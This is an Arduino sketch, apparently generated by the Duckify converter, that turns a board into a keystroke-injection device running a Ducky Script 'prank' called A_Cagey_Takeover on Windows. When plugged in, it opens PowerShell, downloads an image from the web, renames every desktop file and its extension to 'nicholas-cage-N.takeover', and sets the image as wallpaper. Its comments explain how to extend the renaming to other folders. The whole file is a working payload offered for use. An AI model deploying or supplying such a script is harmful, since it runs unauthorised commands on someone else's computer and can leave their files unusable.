// [ ===== Created using duckify.spacehuhn.com @ dev 2a10f486 ===== ] //
// Duckify is a free and Open-Source web-app for converting Ducky Script into Arduino code.
// Please consider supporting us on ko-fi.com/spacehuhn <3
// Learn more about us at spacehuhn.com

// Platform: Arduino
// Keyboard Layout: US


#include <HID.h>

namespace keyboard {
    typedef struct report {
        uint8_t modifiers;
        uint8_t reserved;
        uint8_t keys[6];
    } report;
    
    report prev_report = report { 0x00, 0x00, { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 } };
    
    const uint8_t keyboardDescriptor[] PROGMEM {
        0x05, 0x01, 0x09, 0x06, 0xa1, 0x01, 0x85, 0x02, 0x05, 0x07, 0x19, 0xe0, 0x29, 0xe7, 0x15, 0x00, 0x25, 0x01, 0x75, 0x01, 0x95, 0x08, 0x81, 0x02, 0x95, 0x01, 0x75, 0x08, 0x81, 0x03, 0x95, 0x06, 0x75, 0x08, 0x15, 0x00, 0x25, 0x73, 0x05, 0x07, 0x19, 0x00, 0x29, 0x73, 0x81, 0x00, 0xc0,
    };
    
    report makeReport(uint8_t modifiers = 0, uint8_t key1 = 0, uint8_t key2 = 0, uint8_t key3 = 0, uint8_t key4 = 0, uint8_t key5 = 0, uint8_t key6 = 0);
    
    report makeReport(uint8_t modifiers, uint8_t key1, uint8_t key2, uint8_t key3, uint8_t key4, uint8_t key5, uint8_t key6) {
        return report { modifiers, 0x00, { key1, key2, key3, key4, key5, key6 } };
    }
    
    void begin() {
        static HIDSubDescriptor node(keyboardDescriptor, sizeof(keyboardDescriptor));
        HID().AppendDescriptor(&node);
    }
    
    void send(report* k) {
        HID().SendReport(2, (uint8_t*)k, sizeof(report));
    }
    
    void release() {
        prev_report = makeReport();
        send(&prev_report);
    }

    void type(uint8_t key0, uint8_t key1, uint8_t key2, uint8_t key3, uint8_t key4, uint8_t key5, uint8_t modifiers) {
        prev_report.keys[0] = key0;
        prev_report.keys[1] = key1;
        prev_report.keys[2] = key2;
        prev_report.keys[3] = key3;
        prev_report.keys[4] = key4;
        prev_report.keys[5] = key5;
        prev_report.modifiers = modifiers;
        send(&prev_report);
        release();
    }
}


// powershell
const uint8_t key_arr_0[] PROGMEM = {0,19, 0,18, 0,26, 0,8, 0,21, 0,22, 0,11, 0,8, 0,15, 0,15};
// Invoke-WebRequest -Uri https://wallpapercave.com/wp/GVO9gKu.jpg -OutFile Desktopbslashnickcage.jpg
const uint8_t key_arr_1[] PROGMEM = {2,12, 0,17, 0,25, 0,18, 0,14, 0,8, 0,45, 2,26, 0,8, 0,5, 2,21, 0,8, 0,20, 0,24, 0,8, 0,22, 0,23, 0,44, 0,45, 2,24, 0,21, 0,12, 0,44, 0,11, 0,23, 0,23, 0,19, 0,22, 2,51, 0,56, 0,56, 0,26, 0,4, 0,15, 0,15, 0,19, 0,4, 0,19, 0,8, 0,21, 0,6, 0,4, 0,25, 0,8, 0,55, 0,6, 0,18, 0,16, 0,56, 0,26, 0,19, 0,56, 2,10, 2,25, 2,18, 0,38, 0,10, 2,14, 0,24, 0,55, 0,13, 0,19, 0,10, 0,44, 0,45, 2,18, 0,24, 0,23, 2,9, 0,12, 0,15, 0,8, 0,44, 2,7, 0,8, 0,22, 0,14, 0,23, 0,18, 0,19, 0,49, 0,17, 0,12, 0,6, 0,14, 0,6, 0,4, 0,10, 0,8, 0,55, 0,13, 0,19, 0,10};
// cd Desktop
const uint8_t key_arr_2[] PROGMEM = {0,6, 0,7, 0,44, 2,7, 0,8, 0,22, 0,14, 0,23, 0,18, 0,19};
//  dir | %{Rename-Item $_ -NewName ("nicholas-cage-{0}.takeover" -f $nr++)}
const uint8_t key_arr_3[] PROGMEM = {0,44, 0,7, 0,12, 0,21, 0,44, 2,49, 0,44, 2,34, 2,47, 2,21, 0,8, 0,17, 0,4, 0,16, 0,8, 0,45, 2,12, 0,23, 0,8, 0,16, 0,44, 2,33, 2,45, 0,44, 0,45, 2,17, 0,8, 0,26, 2,17, 0,4, 0,16, 0,8, 0,44, 2,38, 2,52, 0,17, 0,12, 0,6, 0,11, 0,18, 0,15, 0,4, 0,22, 0,45, 0,6, 0,4, 0,10, 0,8, 0,45, 2,47, 0,39, 2,48, 0,55, 0,23, 0,4, 0,14, 0,8, 0,18, 0,25, 0,8, 0,21, 2,52, 0,44, 0,45, 0,9, 0,44, 2,33, 0,17, 0,21, 2,46, 2,46, 2,39, 2,48};
// exit
const uint8_t key_arr_4[] PROGMEM = {0,8, 0,27, 0,12, 0,23};
// Desktop
const uint8_t key_arr_5[] PROGMEM = {2,7, 0,8, 0,22, 0,14, 0,23, 0,18, 0,19};
// nickcage
const uint8_t key_arr_6[] PROGMEM = {0,17, 0,12, 0,6, 0,14, 0,6, 0,4, 0,10, 0,8};
// b
const uint8_t key_arr_7[] PROGMEM = {0,5};

void duckyString(const uint8_t* keys, size_t len) {  
    for(size_t i=0; i<len; i+=2) {
        keyboard::type(pgm_read_byte_near(keys + i+1), 0, 0, 0, 0, 0, pgm_read_byte_near(keys + i));
    }
}

void setup() {
    keyboard::begin();
    delay(2000);

    // Title: A_Cagey_Takeover
    // Author: the-jcksn
    // Description: Nicolas Cage themed Prank - Renames all files on desktop as "nicholas-cage-1.takeover", incrementing the digit. Then sets background image to nicholas cage breaking through the screen. Can be expanded to remane files in further directories if required.
    // Target: Windows / Powershell
    // Version: 1.0
    // Category: Prank
    // ~~~~~ TO DESTROY FURTHER FILENAMES: Copy everything from line 23 to 28, and paste in the space provided, changing the target directory name.
    // ~~~~~ CAN RUN SCRIPT 'AS IS' (WITHOUT CHANGES) - Will just attack files on the desktop
    // ~~~~~ Use responsibly and within the confines of the law. This script renames files AND extensions and can result in being unable to access files if you don't know which file was which. I accept no responsibility for any loss of files or any other consequences. Use at your own risk. 
    delay(1000); // DELAY 1000
    keyboard::type(21, 0, 0, 0, 0, 0, 8); // GUI r
    delay(200); // DELAY 200
    duckyString(key_arr_0, sizeof(key_arr_0)); // STRING powershell
    keyboard::type(40, 0, 0, 0, 0, 0, 0); // ENTER
    delay(200); // DELAY 200
    duckyString(key_arr_1, sizeof(key_arr_1)); // STRING Invoke-WebRequest -Uri https://wallpape...
    keyboard::type(40, 0, 0, 0, 0, 0, 0); // ENTER
    delay(1000); // DELAY 1000
    // ~~~~~~~~~~ REPEAT THE BELOW LINES IF YOU WANT TO NICK TO TAKEOVER FURTHER DIRECTORIES, CHANGING "cd Desktop" TO THE DIRECTORY REQUIRED ~~~~~~~~~~
    duckyString(key_arr_2, sizeof(key_arr_2)); // STRING cd Desktop
    keyboard::type(40, 0, 0, 0, 0, 0, 0); // ENTER
    delay(200); // DELAY 200
    duckyString(key_arr_3, sizeof(key_arr_3)); // STRING  dir | %{Rename-Item $_ -NewName ("nich...
    keyboard::type(40, 0, 0, 0, 0, 0, 0); // ENTER
    delay(200); // DELAY 200
    // ~~~~~~~~~~ END OF LINES TO REPEAT ~~~~~~~~~~
    //            SPACE TO PASTE FURTHER TAKEOVERS (YOU CAN DELETE THIS LINE IF DESIRED)
    // ~~~~~~~~~~ BACK TO BUSINESS, DONT CHANGE ANYTHING BELOW THIS ~~~~~~~~~~
    duckyString(key_arr_4, sizeof(key_arr_4)); // STRING exit
    keyboard::type(40, 0, 0, 0, 0, 0, 0); // ENTER
    delay(200); // DELAY 200
    keyboard::type(21, 0, 0, 0, 0, 0, 8); // GUI r
    delay(200); // DELAY 200
    duckyString(key_arr_5, sizeof(key_arr_5)); // STRING Desktop
    keyboard::type(40, 0, 0, 0, 0, 0, 0); // ENTER
    delay(200); // DELAY 200
    keyboard::type(9, 0, 0, 0, 0, 0, 1); // CTRL f
    delay(500); // DELAY 500
    duckyString(key_arr_6, sizeof(key_arr_6)); // STRING nickcage
    keyboard::type(40, 0, 0, 0, 0, 0, 0); // ENTER
    delay(800); // DELAY 800
    keyboard::type(43, 0, 0, 0, 0, 0, 0); // TAB
    delay(200); // DELAY 200
    keyboard::type(44, 0, 0, 0, 0, 0, 0); // SPACE
    delay(200); // DELAY 200
    keyboard::type(118, 0, 0, 0, 0, 0, 0); // MENU
    delay(200); // DELAY 200
    duckyString(key_arr_7, sizeof(key_arr_7)); // STRING b
    delay(200); // DELAY 200
    keyboard::type(61, 0, 0, 0, 0, 0, 4); // ALT F4
}

void loop() {}

// Created using duckify.spacehuhn.com @ dev 2a10f486
